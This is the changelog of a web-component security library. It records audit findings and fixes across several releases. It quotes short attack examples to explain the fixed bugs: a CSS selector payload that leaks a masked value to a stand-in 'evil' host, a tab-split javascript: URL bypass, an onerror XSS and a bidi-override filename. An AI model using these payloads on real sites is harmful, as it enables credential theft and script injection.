# Changelog

All notable changes to `secure-ui-components` are documented here.

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [0.5.0] — 2026-09-14

Security release. A full audit of the package found that three of the four
foundational invariants — the closed shadow root, tier immutability, and the
card component's CRITICAL lock — were not enforced at runtime. All 28 findings
are fixed. Every fix carries a regression test that reproduces the original
attack.

**Root cause behind several of these:** TypeScript's `protected` is erased at
compile time, so every `protected` member of `SecureBaseComponent` shipped as an
ordinary public prototype method.

### Breaking Changes

- **`element.root` removed.** The closed shadow root is no longer reachable from
  page script. `protected get root()` compiled to a public getter, so
  `el.root.querySelector('input').value` returned the real password of a masked
  CRITICAL field and the raw PAN and CVC of a `<secure-card>`. The privileged
  surface now lives in a module-scoped `WeakMap` — not a `Symbol`, which
  `Object.getOwnPropertySymbols` would reveal.
- **The rest of the privileged surface is withdrawn from the prototype** —
  `initializeSecurity`, `addComponentStyles`, `getBaseStylesheetUrl`, `audit`,
  `clearAuditLog`, `checkRateLimit`, `detectInjection`, `rerender`,
  `recordTelemetryFocus`, `recordTelemetryInput`, `recordTelemetryBlur`,
  `setupAutofillDetection`. `addComponentStyles()` in particular injected CSS
  into the closed shadow root, which a strict CSP does **not** block, enabling
  `input[value^="a"]{background:url(//evil/a)}` exfiltration of a masked value.
  The public API (`value`, `valid`, `securityTier`, `config`, `getAuditLog`,
  `reportError`, `clearExternalError`, `getFieldTelemetry`) is unchanged.
- **`security-tier` is genuinely write-once.** A blocked change now also reverts
  the DOM attribute, because every tier badge and border is a
  `:host([security-tier="…"])` rule — leaving it poisoned repainted a CRITICAL
  field as public, or a public one as critical.
- **Masked values are never written to the light DOM.** `<secure-input>` at a
  masking tier, and `<secure-password-confirm>` in all cases, no longer create a
  hidden input outside a `<secure-form>`; one `document.querySelector` read the
  cleartext otherwise. Wrap the field in `<secure-form>` for native submission.
- **`SignedTelemetryEnvelope` gained `v`, `telemetryDigest` and `boundTo`.** The
  signature previously covered only `environment`, and nothing bound an envelope
  to a submission, so a genuine envelope harvested from a real browser verified
  against an automated submission claiming `riskScore: 0`. The payload is now a
  canonical serialization (recursively sorted keys) so a server that re-serializes
  the JSON reproduces the same bytes.
- **`validation_failed` audit detail changed** — `{ errors, valueLength }` is now
  `{ errorCount, lengthBucket }`. The old shape broadcast the exact character
  count and the specific failure reasons of SENSITIVE and CRITICAL values to
  every listener on the page.
- **`<secure-table>` no longer renders HTML pass-through for masked columns.** A
  `data-tier="critical"` or `"sensitive"` column is masked first, unconditionally.

### Security

- **`<secure-table>` URL sanitiser rewritten to a scheme allowlist.** The
  denylist regex required a contiguous scheme; browsers strip TAB, LF and CR from
  *inside* a scheme before parsing, so `java&#9;script:alert(1)` survived and was
  re-serialized with the raw TAB intact. Only `http`, `https`, `mailto`, `tel`
  and schemeless URLs are kept.
- **`<secure-table>` tier masking applied before HTML pass-through.**
  `#parseSlottedTable` creates a `_html` key for any cell containing a `<`, so a
  CRITICAL SSN column rendered in full whenever the server wrapped it in a
  `<span>`.
- **`<secure-table>` masked tail is escaped.** The SENSITIVE branch returned the
  trailing four characters unescaped into an `innerHTML` sink.
- **`<secure-form>` validates a server-rendered form's own `action`.** On the
  progressive-enhancement path the adopted `<form>`'s `action` was never checked,
  and the CSRF token was then injected into it — full credential exfiltration to
  an attacker origin. The action is re-validated again immediately before native
  submission.
- **Threat state is keyed by the emitting element.** `secure-threat-detected` and
  `secure-threat-cleared` are `{bubbles, composed}`, so any descendant could
  forge a `secure-threat-cleared` naming a flagged field and lift the injection
  block with the payload still in place.
- **`<secure-file-upload>` fails closed on an unrecognised `accept`.** Extensions
  with no MIME mapping were dropped silently; if all of them were unmapped
  (`accept=".webp,.avif"`) the allowlist was empty and the type check was skipped
  entirely, accepting `.html`, `.svg` and `.exe`.
- **`accept="image/*"` no longer re-admits SVG.** An explicit deny set for
  `image/svg+xml`, `text/html` and the XML family is applied after every allow
  path, including wildcards.
- **Filenames containing bidirectional overrides or control characters are
  rejected** — `invoice<RLO>fdp.exe` rendered as `invoiceexe.pdf`.
- **`<secure-card>` CRITICAL lock implemented.** It was documented but absent, so
  `<secure-card security-tier="public">` demoted a payment field from markup.
- **Fallback-input neutralisation moved to the base class.** Only
  `<secure-input>` did it, so for textarea, select and datetime the light-DOM
  fallback kept its `name` — and `#collectFormData` collects raw light-DOM
  controls *after* the secure components, under the same key, overwriting the
  value the user actually typed with stale server-rendered content.
- **Password and confirm boxes use distinct threat keys.** Both passed the same
  field name, so a clean keystroke in the confirm box cleared the flag raised by
  the password box.
- **Audit entries are frozen and dispatched as copies.** The same object was both
  retained and placed in the event detail, so a listener could rewrite history in
  place.
- **`getTierConfig()` guards with `isValidTier`.** A truthiness check on an
  inherited-property lookup meant `getTierConfig('constructor')` returned the
  `Object` constructor rather than the CRITICAL config.
- **`component_disconnected` is loggable again.** Substring matching in the audit
  gate had no branch matching it, so component teardown was never recorded at any
  tier. Replaced with an explicit event-to-gate table.

### Fixed

- **The signed telemetry envelope now reaches the server.** The provider awaited
  SubtleCrypto inside a synchronous `dispatchEvent`, so `SecureForm` had already
  run `JSON.stringify` by the time `_env` was attached. Every submission was
  silently unsigned while appearing to be signed.
- **`<secure-form>` recognises `<secure-password-confirm>` and validates
  `<secure-card>`.** Neither appeared in the validation or collection selectors:
  password match and strength were never enforced, and inside a `<secure-form>`
  the password was never submitted at all while the form reported success.
- **One missing `CSS.escape()`** in `#syncSecureInputsToForm` — a crafted field
  name redirected the write to another field's hidden input, or threw and aborted
  the sync mid-way while the native path submitted anyway.
- **Whitespace-only CSRF tokens are treated as absent.** `!" "` is `false`, so a
  template rendering an empty token turned a fail-closed tier into fail-open.
- **`<secure-table>` binds its action listener once.** `#updateTableContent`
  replaces only the inner HTML, so the container survived and each call added
  another closure: eight search keystrokes then one "delete" click fired nine
  `secure-table-action` events — nine real deletions from one user click.
- **`build/bundler.js` replacement-pattern injection.** `String.prototype.replaceAll`
  interprets `$$`, `$&`, ``$` `` and `$'` in a replacement string, so a `$'` in
  any component stylesheet spliced the remainder of the TypeScript source into
  the generated template literal — producing a bundle whose JS differed from the
  reviewed source, after review.

### CI / Supply chain

- **The build now runs before the tests.** `tests/build/` skips itself when
  `dist/` is missing, and CI ran the tests first — so all 66 build-artifact
  assertions became skips and CI reported green having executed none of them.
  The suite now throws rather than skipping when `dist/` is absent under `CI`.
- **The published root manifest is asserted too.** The `./base-component`
  assertions covered only `dist/package.json`; npm publishes the root one.
- **CycloneDX SBOM** committed as `sbom.json`, generated by `npm run sbom` and
  kept honest by `npm run sbom:check`, which fails when it drifts from the
  dependency tree. Wired into CI and `prepublishOnly`. Zero runtime components.
- **`SECURITY.md` and `sbom.json` ship in the published tarball.**
- `prepublishOnly` now also runs `audit:check` and `sbom:check`.

### Tests

- 1288 tests across 30 files, plus 69 build-artifact assertions.
- New: `tests/core/encapsulation-invariants.test.ts` and
  `tests/core/audit-regressions.test.ts` — each test reproduces the original
  attack, with a control proving the neighbouring legitimate case still works.

---

## [0.4.2] — 2026-06-05

### Security

- **`SecureTable` nested-wrapper XSS bypass closed** — `#sanitizeDomNode` now walks with a live cursor and re-sanitizes the children of an unwrapped element. Payloads hidden inside a stripped wrapper (for example `<p><img onerror=...></p>`) previously survived the pass.
- **`SecureFileUpload` magic-number validation for all tiers** — `#validateFileContent` was only applied at `CRITICAL`. File content signatures are now checked at every security tier.
- **`sanitizeValue()` alignment in `SecureForm`** — `SecureForm` used a `div.innerHTML` round-trip, which double-encoded values already sanitized by the field. It now mirrors the base implementation: strip control characters, return plain text.
- **Strict CSP and HSTS in `server.js`** — Ships `default-src`/`script-src`/`style-src 'self'` with no `unsafe-inline`, plus HSTS, COOP and `Permissions-Policy`. `examples/index.html` is now CSP-clean: styles moved to `examples/styles.css`, scripts to `examples/demo.js`, remote fonts removed.

### Fixed

- **Injection block is lifted when a field is cleared** — A field that previously matched an injection pattern now emits `secure-threat-cleared` (`ThreatClearedDetail`) once its value is clean. `SecureForm` consumes the event to release the submission block. Without it, a single flagged keystroke blocked the form permanently. The base class tracks flagged fields and only fires on the flagged → clean transition.
- **`SecureForm` collects `secure-card` hidden fields** — `#collectFormData()` explicitly queries `secure-card input[type="hidden"]` (last-4, expiry, holder). These are `type="hidden"`, so the standard input query skipped them. PAN and CVC still have no hidden input.
- **`./base-component` no longer exported from the built package** — `build/css-inliner.js` generated a `dist/package.json` exports entry for the base class, contradicting the documented invariant that `SecureBaseComponent` is not public.

### Maintenance

- `npm audit fix` applied to resolve dev-dependency advisories. The published package has no runtime dependencies.

---

## [0.4.1] — 2026-05-26

### Documentation

- **`SECURITY.md`** — Supported version updated to `0.4.x`. CSRF blocking documented explicitly as a client-side control that requires a server-side counterpart.
- **`docs/ARCHITECTURE.md`** — `SecureBaseComponent` marked as not exported. Subclassing examples replaced with the supported composition pattern (wrap a `<secure-input>` in your own custom element).

### Maintenance

- CI: `actions/checkout` v4 → v6, `actions/setup-node` v4 → v6, Node 20 → 22 (Node 20 reached end of life).
- CI: `actions/upload-pages-artifact` v3 → v5, `actions/deploy-pages` v4 → v5.
- `size-limit` configuration reverted after an invalid `esm` option was tried.

---

## [0.4.0] — 2026-05-26

### Breaking Changes

- **`SecureBaseComponent.shadowRoot` removed** — The public override of `Element.shadowRoot` has been renamed to `protected root`. External callers now correctly receive `null` from `Element.shadowRoot` (the expected behaviour for closed shadow DOMs). Internal subclasses use `this.root` instead.
- **`secure-textarea-change` detail: `value` removed** — Raw field values must not propagate via bubbling composed events. Read `(event.target as SecureTextarea).value` directly.
- **`secure-datetime-change` detail: `value` removed** — Same rationale. Read from element.
- **`secure-file-change` detail: `files` changed** — Was `File[]`; now `ReadonlyArray<SecureFileMeta>` (`{ name, size, type }`). Raw `File` objects (which expose `.arrayBuffer()` / `.text()`) must not be accessible to intercepting scripts. Read `(event.target as SecureFileUpload).files` directly.
- **`secure-form-submit` detail: `formData` removed** — Credentials and PII must not travel in a bubbling composed event readable by any page script. Read field values directly from component instances.
- **`secure-card-change` detail: `cardholderName` removed** — PII; combined with `last4` + expiry it partially identifies a card. Use `getCardData()` for SDK handoff.
- **`secure-password-confirm`: event renamed** — No longer dispatches `secure-input-change`. Now dispatches `secure-password-confirm-change` with detail `{ name, tier }`. The old event carried an undocumented `field` property and used the wrong event name.
- **`SECURITY_HEADERS['X-XSS-Protection']` removed** — The header is deprecated and removed from all modern browsers; setting it to `1; mode=block` increases attack surface via legacy browser quirks. Strict CSP is the correct mitigation.
- **`SecureForm` now blocks CSRF-absent submissions** — Previously fired a `secure-threat-detected` event but still allowed submission to proceed. Now calls `event.preventDefault()` and shows an error when a `sensitive`/`critical` form has no CSRF token.
- **`SecureForm` HTTP method validation** — `GET`, `HEAD`, and other non-body methods are rejected and default to `POST`. Accepting GET would put form data in the URL, exposing credentials to server logs and browser history.
- **`SecureForm` fetch mode changed** — `mode: 'cors'` → `mode: 'same-origin'` (action URLs are already validated to same-origin; the mode is now explicit).

### Fixed

- **Closed shadow DOM was publicly accessible** — The `shadowRoot` getter override meant any external script could access the live shadow root. Now correctly returns `null` via `Element.shadowRoot`.
- **`attributeChangedCallback` infinite recursion** — Calling `setAttribute('security-tier', oldValue)` from within the callback re-triggered it with swapped arguments. The revert call has been removed; the internal `#securityTier` field is already immutable.
- **`sanitizeValue()` double-encoding** — Previously returned `div.innerHTML` (HTML entities). When assigned to `.textContent`, `option.value`, `.name`, etc., entities appeared literally (e.g. `Tom &amp; Jerry`). Now strips null bytes and control characters only and returns plain text. XSS protection for all current call sites comes from DOM property assignment, not encoding.
- **`SecureForm#collectFormData` data corruption** — `sanitizeValue()` (which returned HTML-encoded strings) was applied to field values before JSON-serialising to the server. HTML entities in a JSON body were sent to the server verbatim. Fixed by removing the encode step.
- **`cancelSubmission()` had no effect** — The callback set `#isSubmitting = false` but the check was `if (!shouldContinue)` which only tested `event.preventDefault()`. Added a `submissionCancelled` flag checked independently after event dispatch.
- **SVG in file-upload extension map** — `.svg` → `image/svg+xml` removed from `#extensionToMimeType`. SVG files can contain `<script>` elements and event handlers; accepting them without server-side sanitisation is a stored XSS vector.
- **`#knownScripts` stale on reconnect** (`SecureTelemetryProvider`) — The script snapshot was not cleared in `disconnectedCallback`. Scripts injected between disconnect and reconnect would be treated as pre-existing and go undetected. Now cleared on disconnect.
- **All `this.shadowRoot` references in components** — `SecureCard`, `SecureTable`, and telemetry methods in `SecureBaseComponent` were using the now-removed public getter. Updated to use `this.root` (protected) or `this.#shadow` (private field) directly.

### Added

- **`SecureFileMeta` type** — New exported interface `{ readonly name: string; readonly size: number; readonly type: string }` used in `SecureFileChangeDetail.files`.
- **`SecurePasswordConfirmChangeDetail` type** — New exported interface `{ name: string; tier: SecurityTierValue }` for the `secure-password-confirm-change` event.

### Tests

- 1207 tests across 27 test files, all passing.
- Updated assertions to match new event contracts and shadow DOM access pattern.
- Added CSRF-blocking and method-validation coverage.

---

## [0.3.x] — 2026-04-16

### Added

- **`SecureForm` injection blocking** — If any child field fires `secure-threat-detected` with `threatType: 'injection'` during a session, form submission is now blocked entirely. The form sets `data-state="blocked"`, the offending field receives an inline error via the new `reportError()` API, and `secure-form-submit` is never dispatched. Resets cleanly via `form.reset()`.
- **`SecureForm` form state feedback** — `<secure-form>` now sets a `data-state` attribute (`blocked` / `success` / `error`) on submission lifecycle events. The built-in stylesheet applies a coloured `outline` to the inner `<form>` for each state; `success` auto-clears after 3 s. Override via `secure-form[data-state="..."] .secure-form`.
- **Non-blocking risk warnings on fields** — At submission, `<secure-form>` calls `reportError(message, 'warning')` on each field whose telemetry snapshot triggers a risk signal (`field_filled_without_focus`, `high_velocity_typing`, `all_fields_pasted`, `form_probing`, `high_correction_count`). Submission still proceeds; the server receives the full telemetry.
- **`SessionTelemetry.detectedThreats`** (`types.ts`) — New optional field on `SessionTelemetry`. Populated with all `ThreatDetectedDetail` records collected during the session; omitted when no threats occurred. Travels to the server in `_telemetry`.
- **New risk signals** — `injection_detected` (+40, blocks) and `csrf_token_absent` (+20, non-blocking) added to `#computeRiskScore`.
- **`SecureBaseComponent.reportError(message, variant?)` / `clearExternalError()`** — New public methods on all field components. Allow `<secure-form>` (and user code) to surface form-level error or warning messages on individual fields without disturbing the field's own validation state. Uses a dedicated `.external-error` slot in the shadow DOM so the field's `#clearErrors()` does not clobber these messages.
- **`.external-error` CSS class** (`base.css`) — Styles for the external error slot: red for `variant="error"`, amber for `variant="warning"`, using `color-mix()` tints of the existing `--secure-ui-color-error` / `--secure-ui-color-warning` tokens.

### Tests

- 1197 tests across 27 test files, all passing (up from 1182).
- New coverage: `reportError`/`clearExternalError` API, `connectedCallback` idempotency, injection blocking, form state transitions, risk warning field annotation, rate-limit exceeded and window-reset paths.
- All per-file and global coverage thresholds pass.

---

## [0.1.1] — 2026-03-13

### Added

#### New Components
- **SecureCard** — Payment card input with PAN masking, Luhn validation, card brand detection (Visa, Mastercard, Amex, Discover), expiry/CVC fields, and critical-tier defaults.
- **SecureTelemetryProvider** — Optional wrapper component that enriches form submissions with a signed environmental signals envelope. Detects automation/headless browsers, DOM script injection, suspicious screen sizes, pointer type, mouse movement, and keyboard activity.

#### Behavioral Telemetry System
- **Field-level telemetry** (`SecureBaseComponent`) — All input components now track: dwell time, completion time, typing velocity (keystrokes/sec), correction count, paste detection (`insertFromPaste`), autofill detection (`insertReplacementText`), focus count, and blur-without-change.
- **Session-level aggregation** (`SecureForm`) — `secure-form-submit` and `secure-form-success` events now include a `telemetry: SessionTelemetry` payload with per-field snapshots and a computed risk score (0–100).
- **Risk scoring engine** — 7 additive signals: `session_too_fast` (+30), `session_fast` (+10), `all_fields_pasted` (+25), `high_velocity_typing` (+15), `field_filled_without_focus` (+15), `form_probing` (+10), `high_correction_count` (+5); autofill bonus (−10). Capped at 100.
- **Environmental signals** (`SecureTelemetryProvider`) — On `secure-form-submit`, collects a point-in-time snapshot of browser environment signals and attaches a HMAC-SHA-256 signed envelope (`_env`) to `detail.telemetry`.
- **Submission payload** — Form submissions now send `{ ...formData, _telemetry: SessionTelemetry }` as a single JSON body.

#### New Types (`src/core/types.ts`)
- `FieldTelemetryState`, `FieldTelemetry`, `FieldTelemetrySnapshot`, `SessionTelemetry`
- `EnvironmentalSignals`, `SignedTelemetryEnvelope`
- `SecureFormSubmitEventDetail` and `SecureFormSuccessEventDetail` updated to include `telemetry: SessionTelemetry`

### Fixed
- Corrected `package.json` exports map — `secure-card`, `secure-submit-button`, and `secure-telemetry-provider` were missing per-component named exports.
- Build script now copies `secure-card.css` and `secure-telemetry-provider` to `dist/` (previously `secure-card.css` was not copied, breaking production styles).
- `dist/package.json` export key `./tokens` corrected to `./tokens.css` to match `package.json`.

### Tests
- 869 tests across 23 test files, all passing.
- New test files: `tests/core/telemetry.test.ts` (19 tests), `tests/components/secure-form-telemetry.test.ts` (16 tests), `tests/components/secure-telemetry-provider.test.ts` (20 tests).
- Global coverage: 92.58% statements, 80.37% branches, 94.04% functions, 93.63% lines.

---

## [0.1.0-beta.1] — 2026-03-10

Initial public beta release.

### Components

- **SecureInput** — Text input with XSS prevention, password strength meter, masking for critical tier, rate limiting, and audit logging.
- **SecureTextarea** — Multi-line input with character counting, sanitization, and audit logging.
- **SecureSelect** — Dropdown with option value validation (whitelist), XSS prevention on option text/values, and multi-select support.
- **SecureForm** — Form container with CSRF token injection, progressive enhancement (adopts server-rendered `<form>`), rate-limited submission, and native + fetch-enhanced submit modes.
- **SecureFileUpload** — Drag-and-drop file upload with magic-number content validation, dangerous filename rejection, malware scan hook (`setScanHook`), and file size/type enforcement.
- **SecureDateTime** — Date/time picker with format validation, min/max range enforcement, year-range limits for critical tier, and timezone display.
- **SecureTable** — Data table with sorting, filtering, pagination, per-column security tier masking (sensitive/critical), XSS-safe cell rendering, and progressive enhancement from slotted server-rendered markup.
- **SecureSubmitButton** — Accessible submit button with loading state, disabled-during-submission guard, and security tier integration.

### Security

- 4-tier security system: `public`, `authenticated`, `sensitive`, `critical`
- XSS prevention via `div.textContent` round-trip sanitization (no `innerHTML` with user input)
- CSRF token injection with configurable field name and header name
- Rate limiting on all interactive components at `sensitive` and `critical` tiers
- Autocomplete disabled at `sensitive` and `critical` tiers
- Comprehensive audit log (`getAuditLog()`) on all components
- `secure-audit` event dispatched on all security-relevant actions
- SVG icon construction via `createElementNS` (CSP-safe, no `innerHTML`)
- Styles via `adoptedStyleSheets` (CSP-safe, no `<style>` injection)

### Accessibility

- WCAG 2.2 AA compliant
- `aria-invalid`, `aria-required`, `aria-describedby` wiring on all inputs
- `aria-label` fallback from `name` attribute when no visible label is provided
- `aria-sort` on sortable table headers
- `role="alert"` on all error containers (no conflicting `aria-live`)
- Focus indicators meet WCAG 2.4.7 including forced-colors mode
- `:focus-within` ring on file-upload drop zone
- Decorative emoji/icons hidden from accessibility tree

### Developer Experience

- Zero runtime dependencies — pure TypeScript
- ES module output with named per-component exports
- Full TypeScript declarations (`.d.ts`) included
- CSS design tokens at `:root` for global theming
- `::part()` API for styling internal elements
- Progressive enhancement: all components render meaningful markup without JavaScript
- SSR-friendly (no document access in constructors)
- Comprehensive test suite: 689 tests, 80%+ branch coverage

[0.1.0-beta.1]: https://github.com/Barryprender/Secure-UI/releases/tag/v0.1.0-beta.1
